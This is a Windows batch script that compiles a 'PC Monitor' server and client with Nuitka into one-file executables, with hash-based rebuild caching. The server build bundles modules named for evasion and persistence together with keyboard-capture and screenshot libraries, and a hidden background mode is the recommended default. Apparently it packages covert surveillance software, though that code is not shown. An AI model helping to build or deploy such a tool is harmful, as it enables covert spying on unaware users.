@echo off
echo ========================================
echo PC Monitor Cached Build Script
echo ========================================
echo.

REM Enable delayed expansion for variables in loops
setlocal enabledelayedexpansion

REM Create cache directory
if not exist ".build_cache" mkdir .build_cache

REM Check Python version
python --version
echo.

REM Check if Nuitka is installed
python -m nuitka --version >nul 2>&1
if errorlevel 1 (
    echo Nuitka not found. Installing...
    pip install nuitka
    echo.
)

REM ========================================
REM CACHE CHECKING FUNCTION
REM ========================================

echo Checking for file changes...
echo.

set REBUILD_SERVER=0
set REBUILD_CLIENT=0

REM Check server files
for %%F in (server.py server_modules\*.py evasion_modules\*.py persistence_modules\*.py) do (
    if exist "%%F" (
        REM Get file hash
        for /f "delims=" %%H in ('certutil -hashfile "%%F" MD5 ^| findstr /v "hash"') do set NEWHASH=%%H
        
        REM Compare with cached hash
        if exist ".build_cache\%%~nxF.hash" (
            set /p OLDHASH=<".build_cache\%%~nxF.hash"
            if not "!NEWHASH!"=="!OLDHASH!" (
                echo Changed: %%F
                set REBUILD_SERVER=1
            )
        ) else (
            echo New: %%F
            set REBUILD_SERVER=1
        )
        
        REM Save new hash
        echo !NEWHASH!>".build_cache\%%~nxF.hash"
    )
)

REM Check client files
for %%F in (client.py client_modules\*.py) do (
    if exist "%%F" (
        REM Get file hash
        for /f "delims=" %%H in ('certutil -hashfile "%%F" MD5 ^| findstr /v "hash"') do set NEWHASH=%%H
        
        REM Compare with cached hash
        if exist ".build_cache\%%~nxF.hash" (
            set /p OLDHASH=<".build_cache\%%~nxF.hash"
            if not "!NEWHASH!"=="!OLDHASH!" (
                echo Changed: %%F
                set REBUILD_CLIENT=1
            )
        ) else (
            echo New: %%F
            set REBUILD_CLIENT=1
        )
        
        REM Save new hash
        echo !NEWHASH!>".build_cache\%%~nxF.hash"
    )
)

echo.
echo Build Status:
if %REBUILD_SERVER%==0 (
    echo   Server: No changes detected
) else (
    echo   Server: Changes detected - REBUILD REQUIRED
)

if %REBUILD_CLIENT%==0 (
    echo   Client: No changes detected
) else (
    echo   Client: Changes detected - REBUILD REQUIRED
)
echo.

REM Check if builds exist
set SERVER_EXISTS=0
set CLIENT_EXISTS=0
if exist "dist\PCMonitor.exe" set SERVER_EXISTS=1
if exist "dist\PCMonitorClient.exe" set CLIENT_EXISTS=1

REM Determine what needs building
if %REBUILD_SERVER%==0 if %SERVER_EXISTS%==1 (
    echo Server is up to date - skipping build
    set SKIP_SERVER=1
) else (
    set SKIP_SERVER=0
)

if %REBUILD_CLIENT%==0 if %CLIENT_EXISTS%==1 (
    echo Client is up to date - skipping build
    set SKIP_CLIENT=1
) else (
    set SKIP_CLIENT=0
)

REM If nothing to build, exit
if %SKIP_SERVER%==1 if %SKIP_CLIENT%==1 (
    echo.
    echo All builds are up to date!
    echo.
    pause
    exit /b 0
)

REM ========================================
REM BUILD CONFIGURATION
REM ========================================
echo.
echo Select what to build:
if %SKIP_SERVER%==0 if %SKIP_CLIENT%==0 (
    echo 1. Build Server only
    echo 2. Build Client only
    echo 3. Build Both
    set /p BUILD_CHOICE="Enter choice (1-3) [default: 3]: "
    if "!BUILD_CHOICE!"=="" set BUILD_CHOICE=3
) else if %SKIP_SERVER%==0 (
    echo Server needs rebuilding
    set BUILD_CHOICE=1
) else if %SKIP_CLIENT%==0 (
    echo Client needs rebuilding
    set BUILD_CHOICE=2
)

echo.
echo Select console window mode:
echo 1. No console (silent background mode - recommended)
echo 2. With console (see output/debug info)
echo.
set /p CONSOLE_CHOICE="Enter choice (1-2) [default: 1]: "
if "%CONSOLE_CHOICE%"=="" set CONSOLE_CHOICE=1

echo.
echo Select optimization level:
echo 1. Fast build (development)
echo 2. Optimized build (production - smaller, faster)
echo.
set /p OPTIMIZE_CHOICE="Enter choice (1-2) [default: 2]: "
if "%OPTIMIZE_CHOICE%"=="" set OPTIMIZE_CHOICE=2

REM Set console flag
if "%CONSOLE_CHOICE%"=="1" (
    set CONSOLE_FLAG=--windows-disable-console
) else (
    set CONSOLE_FLAG=
)

REM Set optimization flags
if "%OPTIMIZE_CHOICE%"=="2" (
    set OPTIMIZE_FLAGS=--lto=yes
) else (
    set OPTIMIZE_FLAGS=--lto=no
)

REM Detect compiler
set USE_MSVC_FLAG=
where cl.exe >nul 2>&1
if not errorlevel 1 (
    set USE_MSVC_FLAG=--msvc=latest
)

echo.
echo ========================================
echo Starting Build with Nuitka...
echo ========================================
echo.

REM ========================================
REM BUILD SERVER
REM ========================================
if "%BUILD_CHOICE%"=="1" goto BUILD_SERVER
if "%BUILD_CHOICE%"=="3" goto BUILD_SERVER
goto SKIP_SERVER_BUILD

:BUILD_SERVER
if %SKIP_SERVER%==1 (
    echo Server already up to date - skipping
    goto SKIP_SERVER_BUILD
)

echo ========================================
echo Building Server (PCMonitor.exe)...
echo ========================================
echo.

python -m nuitka ^
    --standalone ^
    --onefile ^
    %CONSOLE_FLAG% ^
    %USE_MSVC_FLAG% ^
    --output-dir=dist ^
    --output-filename=PCMonitor.exe ^
    --enable-plugin=tk-inter ^
    --include-package=flask ^
    --include-package=flask_cors ^
    --include-package=pynput ^
    --include-package=PIL ^
    --include-package=requests ^
    --include-package=server_modules ^
    --include-package=evasion_modules ^
    --include-package=persistence_modules ^
    --follow-imports ^
    --assume-yes-for-downloads ^
    %OPTIMIZE_FLAGS% ^
    --show-progress ^
    --show-memory ^
    server.py

if errorlevel 1 (
    echo [ERROR] Server build failed!
    pause
    exit /b 1
)
echo [SUCCESS] Server built successfully!
echo.

:SKIP_SERVER_BUILD

REM ========================================
REM BUILD CLIENT
REM ========================================
if "%BUILD_CHOICE%"=="2" goto BUILD_CLIENT
if "%BUILD_CHOICE%"=="3" goto BUILD_CLIENT
goto SKIP_CLIENT_BUILD

:BUILD_CLIENT
if %SKIP_CLIENT%==1 (
    echo Client already up to date - skipping
    goto SKIP_CLIENT_BUILD
)

echo ========================================
echo Building Client (PCMonitorClient.exe)...
echo ========================================
echo.

python -m nuitka ^
    --standalone ^
    --onefile ^
    %CONSOLE_FLAG% ^
    %USE_MSVC_FLAG% ^
    --output-dir=dist ^
    --output-filename=PCMonitorClient.exe ^
    --enable-plugin=tk-inter ^
    --include-package=PIL ^
    --include-package=requests ^
    --include-package=flask ^
    --include-package=flask_cors ^
    --include-package=client_modules ^
    --follow-imports ^
    --assume-yes-for-downloads ^
    %OPTIMIZE_FLAGS% ^
    --show-progress ^
    --show-memory ^
    client.py

if errorlevel 1 (
    echo [ERROR] Client build failed!
    pause
    exit /b 1
)
echo [SUCCESS] Client built successfully!
echo.

:SKIP_CLIENT_BUILD

REM Clean up temporary Nuitka folders
if exist *.dist rmdir /s /q *.dist
if exist *.build rmdir /s /q *.build
if exist *.onefile-build rmdir /s /q *.onefile-build

REM ========================================
REM BUILD COMPLETE
REM ========================================
echo.
echo ========================================
echo Build Complete!
echo ========================================
echo.
dir dist\*.exe
echo.
echo Build cache saved to .build_cache\
echo Next build will be faster if files haven't changed!
echo.
echo Press any key to open dist folder...
pause >nul
explorer dist